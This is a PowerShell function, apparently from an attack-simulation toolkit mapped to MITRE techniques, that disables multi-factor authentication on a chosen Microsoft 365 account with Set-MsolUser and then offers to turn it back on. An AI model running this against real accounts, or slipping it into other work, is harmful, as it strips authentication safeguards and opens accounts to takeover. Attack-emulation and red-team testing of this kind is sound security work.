function DisableMFA {

    mitre_details("DisableMFA")

    EnterAccount "`n[?] Enter account to disable MFA on (user@org.com)"
    $target_account = $global:account_username

    if ($null -ne $target_account){
        #Disabe MFA
        try {
            MAADWriteProcess "Attempting to disable MFA on account -> $target_account"
            Get-MsolUser -UserPrincipalName $target_account | Set-MsolUser -StrongAuthenticationRequirements @() -ErrorAction Stop
            Start-Sleep -s 5 
            MAADWriteSuccess "Guards Down: MFA disabled on account"
            $allow_undo = $true
        }
        catch {
            MAADWriteError "Failed to disable MFA"
        }   
    }
    else{
        MAADWriteProcess "Terminating module"
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        #Enable MFA
        $user_choice = Read-Host -Prompt "`n[?] Undo: Re-enable MFA on the account (y/n)"

        if ($user_choice -notin "No","no","N","n") {
            MAADWriteProcess "Enabling MFA on account -> $target_account"
            $mfa = New-Object -TypeName Microsoft.Online.Administration.StrongAuthenticationRequirement
            $mfa.RelyingParty = "*"
            $mfa.State = "Enabled"
            $mfax = @($mfa)
            try {
                Set-MsolUser -UserPrincipalName $target_account -StrongAuthenticationRequirements $mfax
                MAADWriteSuccess "Enabled MFA on account"
            }
            catch {
                MAADWriteError "Failed to enable MFA on account"
            }
        }
    }
    MAADPause
}